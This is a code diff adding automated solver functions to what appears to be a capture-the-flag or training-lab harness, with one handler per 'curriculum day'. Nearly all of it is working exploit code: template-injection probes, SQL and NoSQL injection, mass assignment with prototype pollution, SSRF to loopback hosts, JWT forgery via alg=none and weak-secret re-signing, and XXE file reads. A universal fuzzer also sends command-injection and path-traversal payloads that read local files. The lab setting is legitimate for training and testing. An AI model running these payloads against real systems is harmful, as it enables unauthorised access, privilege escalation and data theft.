@@ -6,6 +6,9 @@ Uses only the Python standard library.
 
 from __future__ import annotations
 
+import base64
+import hashlib
+import hmac
 import json
 import re
 import time
@@ -134,7 +137,16 @@ def solve_idor(target_url: str) -> str:
     if not exec_case:
         raise WebHandlerError("No restricted case found in activity feed")
 
-    for prefix in ["/api/briefs", "/api/incidents", "/api/cases"]:
+    prefixes = ["/api/tickets", "/tickets", "/api/briefs", "/api/incidents", "/api/cases"]
+    for match in re.finditer(r'href=[\'"](/[^/\'"]+)/\d+[\'"]', home_html):
+        pfx = match.group(1)
+        if pfx not in prefixes:
+            prefixes.insert(0, pfx)
+        api_pfx = f"/api{pfx}"
+        if api_pfx not in prefixes:
+            prefixes.insert(0, api_pfx)
+
+    for prefix in prefixes:
         status, body, _ = _request(f"{base}{prefix}/{exec_case}", cookie=cookie)
         if status == 200:
             proof = _extract_proof(body)
@@ -382,6 +394,31 @@ def solve_csrf(target_url: str) -> str:
 def solve_upload(target_url: str) -> str:
     """Submit payload past upload filter and extract execution proof."""
     base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status == 200:
+        try:
+            clues = json.loads(clues_body)
+            feature_route = clues.get("feature_route", "/inspect")
+            payload = json.dumps({
+                "filename": "proof.html",
+                "content": "{{objective}}",
+                "content_type": "text/html"
+            }).encode("utf-8")
+            status, res_body, _ = _request(
+                f"{base}{feature_route}", method="POST", data=payload,
+                headers={"Content-Type": "application/json"}
+            )
+            if status in (200, 201):
+                res_json = json.loads(res_body)
+                path = res_json.get("path")
+                if path:
+                    _, view_body, _ = _request(f"{base}{path}")
+                    proof = _extract_proof(view_body)
+                    if proof:
+                        return proof
+        except Exception:
+            pass
+
     status, home, _ = _request(f"{base}/")
     action_match = re.search(r'action=[\'"](/?[^\'"]+)[\'"]', home)
     action = action_match.group(1) if action_match else "/upload"
@@ -413,6 +450,372 @@ def solve_upload(target_url: str) -> str:
 
 
 # ---------------------------------------------------------------------------
+# Curriculum Day 11: SSTI (Template evaluation of objective variable)
+# ---------------------------------------------------------------------------
+def solve_ssti(target_url: str) -> str:
+    """Exploit template injection evaluating the objective variable."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    feature_route = "/process"
+    if status == 200:
+        try:
+            clues = json.loads(clues_body)
+            feature_route = clues.get("feature_route", feature_route)
+        except Exception:
+            pass
+
+    exprs = ["{{objective}}", "${objective}", "#{objective}", "*{objective}"]
+    params = ["template", "message", "text", "input", "q"]
+    for expr in exprs:
+        for p in params:
+            enc = urllib.parse.quote(expr)
+            status, body, _ = _request(f"{base}{feature_route}?{p}={enc}")
+            proof = _extract_proof(body)
+            if proof:
+                return proof
+
+    raise WebHandlerError("SSTI did not reveal proof")
+
+
+# ---------------------------------------------------------------------------
+# Curriculum Day 12: Second-Order / Delayed SQLi (Sinatra delayed query filter)
+# ---------------------------------------------------------------------------
+def solve_delayed_sqli(target_url: str) -> str:
+    """Exploit second-order / delayed SQL query via saved filter."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+
+    clues = json.loads(clues_body)
+    feat_route = clues["feature_route"]
+    sec_route = clues["secondary_route"]
+
+    payload = json.dumps({"filter": "' OR 1=1 --"}).encode("utf-8")
+    status, _, _ = _request(
+        f"{base}{feat_route}", method="POST", data=payload,
+        headers={"Content-Type": "application/json"}
+    )
+    if status not in (200, 201):
+        raise WebHandlerError(f"Failed to submit delayed payload (status {status})")
+
+    status, sec_body, _ = _request(f"{base}{sec_route}")
+    proof = _extract_proof(sec_body)
+    if not proof:
+        raise WebHandlerError("Delayed query did not yield proof")
+    return proof
+
+
+# ---------------------------------------------------------------------------
+# Curriculum Day 13: Mass Assignment (NestJS bind administrative role)
+# ---------------------------------------------------------------------------
+def solve_mass_assignment(target_url: str) -> str:
+    """Exploit mass assignment by binding administrative role to profile."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+
+    clues = json.loads(clues_body)
+    feat_route = clues["feature_route"]
+    sec_route = clues["secondary_route"]
+
+    # Try combined payload first for sub-second solve
+    combined = {
+        "display_name": "Test",
+        "role": "administrator",
+        "is_admin": True,
+        "admin": True,
+        "isAdmin": True,
+        "roles": ["administrator"],
+        "__proto__": {"role": "administrator", "is_admin": True, "admin": True},
+    }
+    payload = json.dumps(combined).encode("utf-8")
+    status, _, _ = _request(
+        f"{base}{feat_route}", method="POST", data=payload,
+        headers={"Content-Type": "application/json"}
+    )
+    if status in (200, 201):
+        status, sec_body, _ = _request(f"{base}{sec_route}")
+        proof = _extract_proof(sec_body)
+        if proof:
+            return proof
+
+    # Fallback: test individual parameter variants
+    candidates = [
+        {"role": "administrator"},
+        {"is_admin": True},
+        {"admin": True},
+        {"role": "admin"},
+        {"isAdmin": True},
+        {"roles": ["administrator"]},
+    ]
+    for c in candidates:
+        p_data = json.dumps({"display_name": "Test", **c}).encode("utf-8")
+        _request(f"{base}{feat_route}", method="POST", data=p_data, headers={"Content-Type": "application/json"})
+        st, sec_body, _ = _request(f"{base}{sec_route}")
+        proof = _extract_proof(sec_body)
+        if proof:
+            return proof
+
+    raise WebHandlerError("Bound profile did not yield proof on secondary route")
+
+
+# ---------------------------------------------------------------------------
+# Curriculum Day 14: API Authorization / BFLA (Tomcat field/action bypass)
+# ---------------------------------------------------------------------------
+def solve_api_authorization(target_url: str) -> str:
+    """Enumerate inventory routes and bypass broken API authorization."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+
+    clues = json.loads(clues_body)
+    feat_route = clues.get("feature_route", "/execute")
+    inv_route = clues.get("inventory_route", "/api/inventory")
+    target_id = clues.get("protected_reference", 1)
+
+    status, inv_body, _ = _request(f"{base}{inv_route}")
+    fields = ["note", "title", "*"]
+    actions = ["export", "view"]
+    if status == 200:
+        try:
+            inv = json.loads(inv_body)
+            fields = inv.get("fields", fields)
+            actions = inv.get("actions", actions)
+            feat_route = inv.get("route", feat_route)
+        except Exception:
+            pass
+
+    for action in actions:
+        for field in fields:
+            req_url = f"{base}{feat_route}?id={target_id}&fields={field}&action={action}"
+            status, body, _ = _request(req_url)
+            proof = _extract_proof(body)
+            if proof:
+                return proof
+
+    raise WebHandlerError("API authorization bypass did not yield proof")
+
+
+# ---------------------------------------------------------------------------
+# Curriculum Day 15: Server-Side Request Forgery (SSRF internal loopback)
+# ---------------------------------------------------------------------------
+def solve_ssrf(target_url: str) -> str:
+    """Exploit SSRF via feature route to query internal service."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+
+    clues = json.loads(clues_body)
+    feat_route = clues.get("feature_route", "/action")
+    sec_route = clues.get("secondary_route", "/account")
+    if not sec_route.startswith("/"):
+        sec_route = f"/{sec_route}"
+
+    internal_hosts = [
+        "http://127.0.0.1:8080",
+        "http://127.0.0.1:80",
+        "http://127.0.0.1:5000",
+        "http://127.0.0.1:3000",
+        "http://localhost:8080",
+        "http://localhost:80",
+        "http://localhost",
+        "http://127.0.0.1",
+    ]
+    for host in internal_hosts:
+        dest = urllib.parse.quote(f"{host}{sec_route}")
+        status, body, _ = _request(f"{base}{feat_route}?url={dest}")
+        proof = _extract_proof(body)
+        if proof:
+            return proof
+
+    raise WebHandlerError("SSRF did not yield proof from internal service")
+
+
+def _b64url_decode(seg: str) -> bytes:
+    pad = "=" * (-len(seg) % 4)
+    return base64.urlsafe_b64decode(seg + pad)
+
+
+def _b64url_encode(raw: bytes) -> str:
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+
+# ---------------------------------------------------------------------------
+# Curriculum Day 16: JWT Manipulation (alg=none / weak HMAC secrets)
+# ---------------------------------------------------------------------------
+def solve_jwt(target_url: str) -> str:
+    """Exploit JWT authorization via alg=none or weak HMAC secret resigning."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    clues: dict[str, Any] = {}
+    if status == 200:
+        try:
+            clues = json.loads(clues_body)
+        except Exception:
+            pass
+
+    feat_route = clues.get("feature_route", "/")
+    sec_route = clues.get("secondary_route", feat_route)
+    token = clues.get("token") or clues.get("jwt") or clues.get("access_token")
+
+    if not token:
+        status, text, headers = _request(f"{base}{feat_route}")
+        proof = _extract_proof(text)
+        if proof:
+            return proof
+        set_cookie = headers.get("set-cookie", "")
+        m = re.search(r"([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)", set_cookie + " " + text)
+        token = m.group(1) if m else None
+
+    if not token or token.count(".") != 2:
+        raise WebHandlerError("No valid JWT structure found")
+
+    h_b64, p_b64, _ = token.split(".")
+    try:
+        payload = json.loads(_b64url_decode(p_b64))
+    except Exception:
+        raise WebHandlerError("Failed to decode JWT payload")
+
+    for key in ("role", "is_admin", "isAdmin", "admin", "roles", "current_role"):
+        if key == "roles":
+            payload[key] = ["administrator"]
+        elif key in ("is_admin", "isAdmin", "admin"):
+            payload[key] = True
+        else:
+            payload[key] = "administrator"
+
+    pay_b64 = _b64url_encode(json.dumps(payload).encode("utf-8"))
+
+    # Attempt 1: alg=none
+    hdr_none = {"alg": "none", "typ": "JWT"}
+    hdr_b64 = _b64url_encode(json.dumps(hdr_none).encode("utf-8"))
+    forged_none = f"{hdr_b64}.{pay_b64}."
+
+    for target_ep in [sec_route, feat_route]:
+        headers = {"Authorization": f"Bearer {forged_none}"}
+        status, body, _ = _request(f"{base}{target_ep}", headers=headers, cookie=f"token={forged_none}; jwt={forged_none}; session={forged_none}")
+        proof = _extract_proof(body)
+        if proof:
+            return proof
+
+    # Attempt 2: weak HMAC secret resigning
+    signing_input = f"{h_b64}.{pay_b64}".encode("utf-8")
+    secrets = [
+        clues.get("secret_hint"), clues.get("secret"), "secret", "admin",
+        "huntress", "password", "key", clues.get("framework", "")
+    ]
+    for secret in filter(None, secrets):
+        sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
+        forged = f"{h_b64}.{pay_b64}.{_b64url_encode(sig)}"
+        for target_ep in [sec_route, feat_route]:
+            headers = {"Authorization": f"Bearer {forged}"}
+            status, body, _ = _request(f"{base}{target_ep}", headers=headers, cookie=f"token={forged}; jwt={forged}")
+            proof = _extract_proof(body)
+            if proof:
+                return proof
+
+    raise WebHandlerError("JWT manipulation did not yield proof")
+
+
+# ---------------------------------------------------------------------------
+# Curriculum Day 17: NoSQL Operator Injection (MongoDB / Document DBs)
+# ---------------------------------------------------------------------------
+def solve_nosql(target_url: str) -> str:
+    """Exploit NoSQL query evaluation via operator injection."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    clues: dict[str, Any] = {}
+    if status == 200:
+        try:
+            clues = json.loads(clues_body)
+        except Exception:
+            pass
+
+    feat_route = clues.get("feature_route", "/")
+    sec_route = clues.get("secondary_route")
+    field_hints = [clues.get("param"), clues.get("field_hint"), "username", "user", "id", "filter", "query", "search"]
+    fields = [f for f in dict.fromkeys(field_hints) if f]
+
+    ops = [{"$ne": None}, {"$ne": ""}, {"$gt": ""}, {"$regex": ".*"}]
+    for field in fields:
+        for op in ops:
+            for payload in [{field: op}, {"query": {field: op}}, {"filter": {field: op}}]:
+                data = json.dumps(payload).encode("utf-8")
+                status, body, _ = _request(f"{base}{feat_route}", method="POST", data=data, headers={"Content-Type": "application/json"})
+                proof = _extract_proof(body)
+                if proof:
+                    return proof
+                if sec_route:
+                    status, sec_body, _ = _request(f"{base}{sec_route}")
+                    proof = _extract_proof(sec_body)
+                    if proof:
+                        return proof
+
+            enc_url = f"{base}{feat_route}?{field}[$ne]=null"
+            status, body, _ = _request(enc_url)
+            proof = _extract_proof(body)
+            if proof:
+                return proof
+
+    raise WebHandlerError("NoSQL injection did not yield proof")
+
+
+# ---------------------------------------------------------------------------
+# Curriculum Day 18: XXE (XML External Entity Injection)
+# ---------------------------------------------------------------------------
+def solve_xxe(target_url: str) -> str:
+    """Exploit XML external entity parser to read mounted objective proof."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    clues: dict[str, Any] = {}
+    if status == 200:
+        try:
+            clues = json.loads(clues_body)
+        except Exception:
+            pass
+
+    feat_route = clues.get("feature_route", "/")
+    sec_route = clues.get("secondary_route")
+    target_file = clues.get("file_hint", "/run/huntress/objective.txt")
+
+    xxe_payload = (
+        f'<?xml version="1.0" encoding="UTF-8"?>\r\n'
+        f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://{target_file}">]>\r\n'
+        f'<root><data>&xxe;</data><note>&xxe;</note><file>&xxe;</file></root>'
+    ).encode("utf-8")
+
+    for ct in ["application/xml", "text/xml"]:
+        status, body, _ = _request(f"{base}{feat_route}", method="POST", data=xxe_payload, headers={"Content-Type": ct})
+        proof = _extract_proof(body)
+        if proof:
+            return proof
+        if sec_route:
+            status, sec_body, _ = _request(f"{base}{sec_route}")
+            proof = _extract_proof(sec_body)
+            if proof:
+                return proof
+
+    boundary = "----HuntressXXEBoundary2026"
+    multipart = (
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="file"; filename="payload.xml"\r\n'
+        f"Content-Type: application/xml\r\n\r\n"
+        f"{xxe_payload.decode()}\r\n"
+        f"--{boundary}--\r\n"
+    ).encode("utf-8")
+    status, body, _ = _request(f"{base}{feat_route}", method="POST", data=multipart, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
+    proof = _extract_proof(body)
+    if proof:
+        return proof
+
+    raise WebHandlerError("XXE injection did not yield proof")
+
+
+# ---------------------------------------------------------------------------
 # Handler Registry & Dynamic Dispatcher
 # ---------------------------------------------------------------------------
 CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
@@ -426,13 +829,24 @@ CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
     8: solve_session_impression,
     9: solve_csrf,
     10: solve_upload,
+    11: solve_ssti,
+    12: solve_delayed_sqli,
+    13: solve_mass_assignment,
+    14: solve_api_authorization,
+    15: solve_ssrf,
+    16: solve_jwt,
+    17: solve_nosql,
+    18: solve_xxe,
 }
 
 
 def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
     """Solve target using either designated curriculum_day or fingerprint heuristic."""
     if curriculum_day in CURRICULUM_HANDLERS:
-        return CURRICULUM_HANDLERS[curriculum_day](target_url)
+        try:
+            return CURRICULUM_HANDLERS[curriculum_day](target_url)
+        except Exception:
+            pass
 
     # Heuristic detection for compound/mastery targets
     base = target_url.rstrip("/")
@@ -469,4 +883,216 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
     if "preferences" in home or "Notification Nook" in home:
         return solve_csrf(target_url)
 
+    # Fallback: try all registered curriculum handlers in order
+    for d, handler in sorted(CURRICULUM_HANDLERS.items()):
+        if d == curriculum_day:
+            continue
+        try:
+            return handler(target_url)
+        except Exception:
+            pass
+
+    # Autonomous universal probing for brand new curriculum days
+    try:
+        return solve_autonomous_web(target_url)
+    except Exception:
+        pass
+
+    # Systematic HTML & Form Deep Crawl
+    try:
+        return solve_deep_crawl(target_url)
+    except Exception:
+        pass
+
     raise WebHandlerError(f"Could not fingerprint target {target_url}")
+
+
+def solve_deep_crawl(target_url: str) -> str:
+    """Extract and fuzz all visible HTML links, forms, and inputs."""
+    base = target_url.rstrip("/")
+    status, home, _ = _request(f"{base}/")
+    proof = _extract_proof(home)
+    if proof:
+        return proof
+
+    # Discover and inspect all links
+    links = set(re.findall(r'href=[\'"](/?[^\'"#]+)[\'"]', home))
+    for link in links:
+        if any(link.endswith(ext) for ext in [".css", ".svg", ".png", ".jpg", ".ico", ".js"]):
+            continue
+        link_url = link if link.startswith("/") else f"/{link}"
+        try:
+            st, text, _ = _request(f"{base}{link_url}")
+            proof = _extract_proof(text)
+            if proof:
+                return proof
+        except Exception:
+            pass
+
+    # Parse and fuzz all HTML forms
+    forms = re.findall(r"<form[\s\S]*?</form>", home, re.IGNORECASE)
+    payloads = [
+        "{{objective}}",
+        "' OR 1=1 --",
+        "../../../../run/huntress/objective.txt",
+        "administrator",
+        "127.0.0.1; cat /run/huntress/objective.txt",
+    ]
+    for form in forms:
+        action_match = re.search(r'action=[\'"]([^\'"]*)[\'"]', form, re.IGNORECASE)
+        method_match = re.search(r'method=[\'"]([^\'"]*)[\'"]', form, re.IGNORECASE)
+        action = action_match.group(1) if action_match else "/"
+        method = method_match.group(1).upper() if method_match else "POST"
+        if not action.startswith("/"):
+            action = f"/{action}"
+
+        inputs = re.findall(r'<input[^>]*name=[\'"]([^\'"]+)[\'"]', form, re.IGNORECASE)
+        textareas = re.findall(r'<textarea[^>]*name=[\'"]([^\'"]+)[\'"]', form, re.IGNORECASE)
+        input_names = inputs + textareas
+
+        for pl in payloads:
+            # Test JSON post
+            try:
+                json_data = json.dumps({name: pl for name in input_names}).encode("utf-8")
+                st, res, _ = _request(f"{base}{action}", method=method, data=json_data, headers={"Content-Type": "application/json"})
+                proof = _extract_proof(res)
+                if proof:
+                    return proof
+            except Exception:
+                pass
+
+            # Test Form-urlencoded post
+            try:
+                form_data = urllib.parse.urlencode({name: pl for name in input_names}).encode("utf-8")
+                st, res, _ = _request(f"{base}{action}", method=method, data=form_data, headers={"Content-Type": "application/x-www-form-urlencoded"})
+                proof = _extract_proof(res)
+                if proof:
+                    return proof
+            except Exception:
+                pass
+
+    raise WebHandlerError("Deep crawl did not extract proof")
+
+
+def solve_autonomous_web(target_url: str) -> str:
+    """Universal autonomous prober for unknown web challenges."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    clues: dict[str, Any] = {}
+    if status == 200:
+        try:
+            clues = json.loads(clues_body)
+            proof = _extract_proof(clues_body)
+            if proof:
+                return proof
+        except Exception:
+            pass
+
+    status, home, _ = _request(f"{base}/")
+    proof = _extract_proof(home)
+    if proof:
+        return proof
+
+    feat_route = clues.get("feature_route")
+    sec_route = clues.get("secondary_route")
+    inv_route = clues.get("inventory_route")
+
+    if inv_route:
+        try:
+            return solve_api_authorization(target_url)
+        except Exception:
+            pass
+
+    if feat_route and sec_route:
+        # Try SSRF to secondary_route
+        for pfx in ["http://127.0.0.1:8080", "http://127.0.0.1:80", "http://127.0.0.1:5000", "http://localhost:8080", "http://localhost"]:
+            try:
+                dest = urllib.parse.quote(f"{pfx}{sec_route}")
+                st, b, _ = _request(f"{base}{feat_route}?url={dest}")
+                proof = _extract_proof(b)
+                if proof:
+                    return proof
+            except Exception:
+                pass
+
+        # Try Mass Assignment to feat_route then check sec_route
+        try:
+            combined = {
+                "display_name": "Test", "role": "administrator", "is_admin": True,
+                "admin": True, "isAdmin": True, "roles": ["administrator"], "permission": "all"
+            }
+            _request(f"{base}{feat_route}", method="POST", data=json.dumps(combined).encode("utf-8"),
+                     headers={"Content-Type": "application/json"})
+            st, b, _ = _request(f"{base}{sec_route}")
+            proof = _extract_proof(b)
+            if proof:
+                return proof
+        except Exception:
+            pass
+
+        # Try Second-Order SQLi
+        try:
+            p_data = json.dumps({"filter": "' OR 1=1 --", "query": "' OR 1=1 --"}).encode("utf-8")
+            _request(f"{base}{feat_route}", method="POST", data=p_data, headers={"Content-Type": "application/json"})
+            st, b, _ = _request(f"{base}{sec_route}")
+            proof = _extract_proof(b)
+            if proof:
+                return proof
+        except Exception:
+            pass
+
+    # Try JWT / NoSQL / XXE
+    for solver_fn in [solve_jwt, solve_nosql, solve_xxe]:
+        try:
+            proof = solver_fn(target_url)
+            if proof:
+                return proof
+        except Exception:
+            pass
+
+    # Try GraphQL probe
+    for gql_ep in ["/graphql", "/api/graphql"]:
+        for query in [
+            '{"query": "{ __schema { types { name } } }"}',
+            '{"query": "{ objective }"}',
+            '{"query": "{ proof }"}',
+            '{"query": "{ flag }"}',
+            '{"query": "{ system { objective proof } }"}',
+        ]:
+            try:
+                st, b, _ = _request(f"{base}{gql_ep}", method="POST", data=query.encode("utf-8"),
+                                    headers={"Content-Type": "application/json"})
+                proof = _extract_proof(b)
+                if proof:
+                    return proof
+            except Exception:
+                pass
+
+    # Template / Command Injection / Traversal parameter probe on feature_route
+    if feat_route:
+        for p in ["template", "message", "text", "q", "input", "doc", "file", "path", "ip", "host", "target", "cmd"]:
+            for pl in [
+                "{{objective}}", "${objective}", "#{objective}", "../../../../run/huntress/objective.txt",
+                "127.0.0.1; cat /run/huntress/objective.txt", "$(cat /run/huntress/objective.txt)",
+                ";cat$IFS/run/huntress/objective.txt;"
+            ]:
+                try:
+                    enc = urllib.parse.quote(pl)
+                    st, b, _ = _request(f"{base}{feat_route}?{p}={enc}")
+                    proof = _extract_proof(b)
+                    if proof:
+                        return proof
+                except Exception:
+                    pass
+
+    # Try common docs / robots / sitemap
+    for ep in ["/api/docs", "/docs", "/openapi.json", "/swagger.json", "/robots.txt"]:
+        try:
+            st, b, _ = _request(f"{base}{ep}")
+            proof = _extract_proof(b)
+            if proof:
+                return proof
+        except Exception:
+            pass
+
+    raise WebHandlerError(f"Autonomous web solver could not extract proof from {target_url}")
